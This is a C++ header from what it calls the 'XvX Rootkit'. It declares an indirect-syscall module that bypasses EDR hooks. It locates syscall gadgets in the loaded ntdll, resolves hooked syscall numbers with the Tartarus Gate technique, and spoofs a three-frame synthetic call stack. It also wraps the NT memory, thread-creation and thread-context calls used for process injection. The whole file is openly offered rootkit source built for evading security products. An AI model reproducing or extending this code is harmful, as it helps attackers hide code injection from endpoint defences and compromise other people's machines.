// XvX Rootkit - Indirect Syscalls (EDR hook bypass via direct NT syscalls)
// Stack spoof: KhaosC2 / SilentMoonwalk inspired — 3-frame synthetic stack (ntdll×2 + kernelbase)

#ifndef INDIRECT_SYSCALLS_H
#define INDIRECT_SYSCALLS_H

#include <windows.h>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

typedef struct _SYSCALL_STATE {
    PVOID SyscallGadget;    // syscall;ret in LOADED ntdll (.text) — image-backed ✓
    PVOID FakeRet1;         // DesyncCallSite: ntdll, [addr-5]==0xE8, bytes=add rsp,0x10;ret
    PVOID FakeRet2;         // NtCallSite:    ntdll, [addr-5]==0xE8 (plain CALL return site)
    PVOID FakeRet3;         // KbCallSite: kernelbase, [addr-5]==0xE8 (CALL return site)
    BOOL  Initialized;
} SYSCALL_STATE;

typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
    DWORD NtQuerySystemInformation;
    DWORD NtReadVirtualMemory;
    DWORD NtClose;
    DWORD NtGetContextThread;
    DWORD NtSetContextThread;
    DWORD NtSuspendThread;
    DWORD NtResumeThread;
} SYSCALL_TABLE;

// ── Spoofed stubs (image-backed gadget + 3-frame fake stack) ─────────────────
// DoSyscallSpoof: ssn, gadget, fakeRet1, fakeRet2, fakeRet3 → then 6 NT args on stack
extern "C" NTSTATUS DoSyscallSpoof(
    DWORD ssn, PVOID syscallGadget, PVOID fakeRet1, PVOID fakeRet2, PVOID fakeRet3,
    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6);

// DoSyscallSpoof11: same header, then 11 NT args on stack (NtCreateThreadEx)
extern "C" NTSTATUS DoSyscallSpoof11(
    DWORD ssn, PVOID syscallGadget, PVOID fakeRet1, PVOID fakeRet2, PVOID fakeRet3,
    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4,
    PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8,
    PVOID arg9, PVOID arg10, PVOID arg11);

class IndirectSyscalls {
private:
    static SYSCALL_STATE g_State;
    static SYSCALL_TABLE g_SSNs;

    // Search loaded (image-backed) ntdll for 0F 05 C3 (syscall;ret)
    static PVOID FindSyscallGadgetInMemory(HMODULE hNtdll);

    // Find address in hMod .text where [addr-5]==0xE8 AND [addr..+4]=="48 83 C4 10 C3"
    static PVOID FindDesyncCallSite(HMODULE hMod);

    // Find address right after 0xE8 (CALL) in hMod .text — plain fake return site
    static PVOID FindCallSite(HMODULE hMod, SIZE_T startOffset = 0);

    // Tartarus Gate: SSN from LOADED ntdll, handles hooked stubs via neighbor interpolation
    static DWORD TartarusSSN(HMODULE hNtdll, const char* funcName);

    // Convenience: fire syscall with 3-frame spoof
    static inline NTSTATUS Syscall6(DWORD ssn,
        PVOID a1, PVOID a2, PVOID a3, PVOID a4, PVOID a5, PVOID a6) {
        return DoSyscallSpoof(ssn,
            g_State.SyscallGadget, g_State.FakeRet1, g_State.FakeRet2, g_State.FakeRet3,
            a1, a2, a3, a4, a5, a6);
    }

public:
    static BOOL Initialize();
    static void Cleanup();

    static NTSTATUS SysNtAllocateVirtualMemory(
        HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
        PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

    static NTSTATUS SysNtWriteVirtualMemory(
        HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
        SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

    static NTSTATUS SysNtProtectVirtualMemory(
        HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect,
        ULONG NewAccessProtection, PULONG OldAccessProtection);

    static NTSTATUS SysNtCreateThreadEx(
        PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
        HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
        ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
        SIZE_T MaximumStackSize, PVOID AttributeList);

    static NTSTATUS SysNtOpenProcess(
        PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, PVOID ClientId);

    static NTSTATUS SysNtReadVirtualMemory(
        HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
        SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);

    static NTSTATUS SysNtQuerySystemInformation(
        ULONG SystemInformationClass, PVOID SystemInformation,
        ULONG SystemInformationLength, PULONG ReturnLength);

    static NTSTATUS SysNtClose(HANDLE Handle);

    static NTSTATUS SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    static NTSTATUS SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    static NTSTATUS SysNtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
    static NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount);

    static BOOL IsInitialized() { return g_State.Initialized; }
};

#endif // INDIRECT_SYSCALLS_H
